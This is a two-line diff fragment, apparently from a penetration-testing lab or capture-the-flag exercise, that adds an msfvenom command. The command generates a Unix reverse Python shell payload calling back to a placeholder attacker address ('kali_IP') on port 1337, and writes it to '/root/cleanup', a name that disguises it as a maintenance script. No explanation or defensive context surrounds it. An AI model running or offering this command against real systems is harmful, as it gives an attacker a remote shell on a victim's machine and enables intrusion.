@@ -1,0 +1,2 @@
+python
+msfvenom -p cmd/unix/reverse_python lhost=kali_IP lport=1337 R -o /root/cleanup
